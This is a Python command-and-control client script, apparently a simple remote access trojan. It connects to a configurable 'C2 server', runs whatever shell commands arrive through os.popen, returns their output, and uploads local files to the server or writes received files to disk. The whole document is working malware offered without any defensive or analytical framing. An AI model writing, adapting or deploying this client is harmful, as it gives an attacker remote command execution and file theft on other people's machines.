import socket
import os

# Client setup
SERVER_HOST = '127.0.0.1'  # Change to the C2 server's IP
SERVER_PORT = 9999

def listen_for_commands():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    while True:
        # Receive the command from the server
        command = client.recv(1024).decode()
        
        if command.lower() == 'exit':
            print("Exiting client.")
            break

        # Handle file upload command
        elif command.startswith('upload'):
            filename = command.split()[1]
            upload_file(client, filename)

        # Handle file download command
        elif command.startswith('download'):
            filename = command.split()[1]
            download_file(client, filename)

        else:
            response = os.popen(command).read()
            if not response:
                response = "Command executed, but no output returned."
            client.send(response.encode())

def upload_file(client, filename):
    client.send(f"Ready to upload {filename}".encode())
    file_size = int(client.recv(1024).decode())

    with open(filename, "rb") as f:
        client.send(f.read())

    print(f"File {filename} uploaded.")

def download_file(client, filename):
    client.send(f"Requesting to download {filename}".encode())
    file_size = int(client.recv(1024).decode())

    with open(f"downloaded_{filename}", "wb") as f:
        data = client.recv(file_size)
        f.write(data)

    print(f"File {filename} downloaded.")

if __name__ == '__main__':
    listen_for_commands()
